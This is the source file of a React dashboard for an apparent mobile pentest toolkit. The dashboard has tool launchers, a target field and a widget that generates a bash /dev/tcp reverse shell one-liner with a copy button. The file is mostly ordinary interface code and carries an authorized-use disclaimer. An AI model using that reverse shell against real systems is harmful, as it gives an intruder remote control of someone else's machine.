import React, { useState, useEffect } from 'react';
import { Shield, KeyRound, Globe, Network, Binary, Search, Terminal, Zap, CheckCircle2, AlertTriangle, ArrowRight, Copy, Check, Lock, Cpu } from 'lucide-react';

export default function DashboardView({ setActiveTab, activeTarget, setActiveTarget, addLog }) {
  const [apiStatus, setApiStatus] = useState('CHECKING');
  const [copiedPayload, setCopiedPayload] = useState(null);
  const [lhost, setLhost] = useState('10.10.14.5');
  const [lport, setLport] = useState('4444');

  useEffect(() => {
    fetch('/api/health')
      .then((res) => res.json())
      .then((data) => {
        if (data.status === 'ONLINE') {
          setApiStatus('ONLINE');
        } else {
          setApiStatus('ERROR');
        }
      })
      .catch(() => setApiStatus('OFFLINE'));
  }, []);

  const quickTools = [
    { id: 'passhash', name: 'Hash & Password', desc: 'Auto-Identify, Generate & Crack', icon: KeyRound, color: 'from-amber-500/20 to-orange-500/10 border-amber-500/30 text-amber-400' },
    { id: 'websec', name: 'Web App Audit', desc: 'Headers, CORS & Vulnerability Fuzzer', icon: Globe, color: 'from-cyan-500/20 to-blue-500/10 border-cyan-500/30 text-cyan-400' },
    { id: 'network', name: 'Network Scanner', desc: 'Port Scan, Banner Grab & Subnet CIDR', icon: Network, color: 'from-emerald-500/20 to-teal-500/10 border-emerald-500/30 text-emerald-400' },
    { id: 'encoder', name: 'Encoder / JWT', desc: 'Base64, Hex, JWT Inspector & Ciphers', icon: Binary, color: 'from-purple-500/20 to-violet-500/10 border-purple-500/30 text-purple-400' },
    { id: 'osint', name: 'OSINT Footprint', desc: 'User Handles, Google Dorks & DNS', icon: Search, color: 'from-rose-500/20 to-pink-500/10 border-rose-500/30 text-rose-400' },
    { id: 'payloads', name: 'Payload Library', desc: 'Reverse Shells, WebShells & MSF', icon: Terminal, color: 'from-emerald-500/20 to-cyan-500/10 border-emerald-500/30 text-emerald-400' }
  ];

  const quickShell = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;

  const copyQuickShell = () => {
    navigator.clipboard.writeText(quickShell);
    setCopiedPayload(true);
    addLog('SUCCESS', 'Copied Quick Reverse Shell Payload', { shell: quickShell, lhost, lport });
    setTimeout(() => setCopiedPayload(false), 2000);
  };

  return (
    <div className="space-y-4 pb-20">
      {/* Target & API Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-slate-900 to-slate-950 p-4 rounded-xl border border-slate-800 shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full blur-3xl pointer-events-none"></div>

        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <div className="flex items-center space-x-2">
              <span className="font-extrabold text-lg text-slate-100 font-sans tracking-wide">
                Active Assessment Target
              </span>
              <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border flex items-center space-x-1 ${
                apiStatus === 'ONLINE'
                  ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30'
                  : 'bg-red-500/10 text-red-400 border-red-500/30'
              }`}>
                <span className={`w-1.5 h-1.5 rounded-full ${apiStatus === 'ONLINE' ? 'bg-emerald-400 animate-ping' : 'bg-red-400'}`}></span>
                <span>API {apiStatus}</span>
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">Configure default IP / Domain target for automated audit tools.</p>
          </div>

          <div className="flex items-center space-x-2">
            <input
              type="text"
              value={activeTarget}
              onChange={(e) => setActiveTarget(e.target.value)}
              placeholder="e.g., scanme.nmap.org"
              className="bg-slate-950 border border-slate-700 focus:border-emerald-500 rounded-lg px-3 py-2 text-xs font-mono text-emerald-400 focus:outline-none w-full sm:w-52 shadow-inner"
            />
          </div>
        </div>
      </div>

      {/* Quick Launch Tools Grid */}
      <div>
        <div className="flex items-center justify-between mb-2">
          <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-slate-400 flex items-center">
            <Zap className="w-3.5 h-3.5 mr-1 text-emerald-400" />
            Tool Categories & Launcher
          </h2>
          <span className="text-[10px] text-slate-500 font-mono">6 Powered Modules</span>
        </div>

        <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 gap-2.5">
          {quickTools.map((tool) => {
            const Icon = tool.icon;
            return (
              <button
                key={tool.id}
                onClick={() => setActiveTab(tool.id)}
                className={`p-3 rounded-xl border bg-gradient-to-br ${tool.color} text-left transition-all hover:scale-[1.02] active:scale-[0.98] flex flex-col justify-between group shadow-lg`}
              >
                <div>
                  <div className="flex items-center justify-between mb-1.5">
                    <Icon className="w-5 h-5" />
                    <ArrowRight className="w-3.5 h-3.5 opacity-0 group-hover:opacity-100 transition-opacity" />
                  </div>
                  <h3 className="font-bold text-xs text-slate-100">{tool.name}</h3>
                  <p className="text-[10px] text-slate-400 line-clamp-2 mt-0.5 font-sans leading-tight">
                    {tool.desc}
                  </p>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Quick Reverse Shell Generator Widget */}
      <div className="bg-slate-900/90 rounded-xl border border-slate-800 p-3.5 shadow-xl">
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center space-x-2">
            <Terminal className="w-4 h-4 text-emerald-400" />
            <span className="text-xs font-mono font-bold text-slate-200">Express Reverse Shell Generator</span>
          </div>
          <button
            onClick={() => setActiveTab('payloads')}
            className="text-[10px] text-emerald-400 hover:underline font-mono flex items-center"
          >
            Full Shell Library &rarr;
          </button>
        </div>

        <div className="grid grid-cols-2 gap-2 mb-2 font-mono text-xs">
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">LHOST (Your IP):</label>
            <input
              type="text"
              value={lhost}
              onChange={(e) => setLhost(e.target.value)}
              className="bg-slate-950 border border-slate-800 focus:border-emerald-500 text-slate-200 rounded px-2 py-1 w-full text-xs"
            />
          </div>
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">LPORT:</label>
            <input
              type="text"
              value={lport}
              onChange={(e) => setLport(e.target.value)}
              className="bg-slate-950 border border-slate-800 focus:border-emerald-500 text-slate-200 rounded px-2 py-1 w-full text-xs"
            />
          </div>
        </div>

        <div className="bg-slate-950 rounded-lg p-2.5 border border-slate-800/80 flex items-center justify-between font-mono text-xs">
          <code className="text-emerald-400 truncate mr-2 select-all font-mono text-[11px]">{quickShell}</code>
          <button
            onClick={copyQuickShell}
            className="p-1.5 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 rounded transition-all flex items-center space-x-1 shrink-0 text-[11px]"
          >
            {copiedPayload ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
            <span>{copiedPayload ? 'Copied' : 'Copy'}</span>
          </button>
        </div>
      </div>

      {/* Security Assessment Checklist & Specs */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
        <div className="bg-slate-900/60 rounded-xl border border-slate-800 p-3">
          <div className="flex items-center space-x-1.5 mb-2 text-xs font-mono font-bold text-slate-300">
            <Cpu className="w-3.5 h-3.5 text-cyan-400" />
            <span>Pentest Workflow Shortcuts</span>
          </div>
          <ul className="text-xs text-slate-400 space-y-1.5 font-sans">
            <li className="flex items-center space-x-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span>1. Perform active port scan & banner discovery</span>
            </li>
            <li className="flex items-center space-x-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span>2. Check HTTP Security Headers & CORS policies</span>
            </li>
            <li className="flex items-center space-x-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span>3. Extract subdomains & perform OSINT search</span>
            </li>
            <li className="flex items-center space-x-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span>4. Build XSS/SQLi vectors & craft shell payloads</span>
            </li>
          </ul>
        </div>

        <div className="bg-slate-900/60 rounded-xl border border-slate-800 p-3 flex flex-col justify-between">
          <div>
            <div className="flex items-center space-x-1.5 mb-1.5 text-xs font-mono font-bold text-slate-300">
              <Lock className="w-3.5 h-3.5 text-amber-400" />
              <span>Compliance & Legal Disclaimer</span>
            </div>
            <p className="text-[11px] text-slate-400 leading-relaxed font-sans">
              NexusSec Mobile Pentest Suite is built for authorized cybersecurity testing and educational research.
              Only test systems you own or have explicit authorization to assess.
            </p>
          </div>
          <div className="text-[10px] font-mono text-slate-500 mt-2">
            Engine: Python 3.11 / Flask + React / Tailwind CSS
          </div>
        </div>
      </div>
    </div>
  );
}
